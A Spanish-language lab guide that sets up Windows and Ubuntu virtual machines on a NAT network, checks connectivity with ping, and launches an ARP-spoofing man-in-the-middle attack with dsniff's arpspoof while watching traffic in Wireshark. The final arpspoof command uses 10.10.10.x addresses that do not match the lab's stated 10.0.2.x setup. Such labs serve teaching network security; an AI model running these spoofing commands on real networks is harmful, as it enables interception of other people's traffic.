Este laboratorio necesita una red nat que compartirán las máquinas virtuales.


Este laboratorio cuenta con dos máquina virtuales:
- Windows 10 con configuración de la red: red nat. IP 10.0.2.15
- Ubuntu 23.10 con configuración de la red: red nat. IP: 10.0.2.4

Comprobamos que la máquina virtual linux vea a la windows:
```
ping 10.0.2.15
PING 10.0.2.15 (10.0.2.15) 56(84) bytes of data.
64 bytes from 10.0.2.15: icmp_seq=1 ttl=128 time=0.942 ms
64 bytes from 10.0.2.15: icmp_seq=2 ttl=128 time=0.509 ms
64 bytes from 10.0.2.15: icmp_seq=3 ttl=128 time=0.995 ms
^C
--- 10.0.2.15 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2043ms
rtt min/avg/max/mdev = 0.509/0.815/0.995/0.217 ms
```


Comprobamos que la máquina virtual windows vea a la Linux:
```
C:\Windows\system32>ping 10.0.2.4
Haciendo ping a 10.0.2.4 con 32 bytes de datos:
Respuesta desde 10.0.2.4: bytes=32 tiempo<1m TTL=64
Respuesta desde 10.0.2.4: bytes=32 tiempo=1ms TTL=64
Respuesta desde 10.0.2.4: bytes=32 tiempo=1ms TTL=64
Respuesta desde 10.0.2.4: bytes=32 tiempo=1ms TTL=64

Estadísticas de ping para 10.0.2.4:
    Paquetes: enviados = 4, recibidos = 4, perdidos = 0
    (0% perdidos),
Tiempos aproximados de ida y vuelta en milisegundos:
    Mínimo = 0ms, Máximo = 1ms, Media = 0ms
```

En la máquina Windows:
- No hace falta desactivar el antivirus de Windows. Funciona igualmente.
- Abrimor Wireshark  para snifar el tráfico.



En la máquina Linux instalamos dsniff y lanzamos el ataque unos segundos:
```
sudo apt-get install dsniff
sudo apt install nmap
sudo nmap --iflist
[sudo] contraseña para usuario: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 20:29 CET
************************INTERFACES************************
DEV     (SHORT)   IP/MASK       TYPE     UP MTU   MAC
lo      (lo)      127.0.0.1/8   loopback up 65536
lo      (lo)      ::1/128       loopback up 65536
enp0s3  (enp0s3)  10.0.2.4/24   ethernet up 1500  08:00:27:AB:BD:F3
docker0 (docker0) 172.17.0.1/16 ethernet up 1500  02:42:1B:03:99:67

**************************ROUTES**************************
DST/MASK       DEV     METRIC GATEWAY
10.0.2.0/24    enp0s3  100
172.17.0.0/16  docker0 0
169.254.0.0/16 enp0s3  1000
0.0.0.0/0      enp0s3  100    10.0.2.1
::1/128        lo      0
::1/128        lo      256
sudo arpspoof -i [interfaz] -t [víctima] [puerta de enlace]
sudo arpspoof -i enp0s3 -t 10.10.10.5 10.10.10.1
```
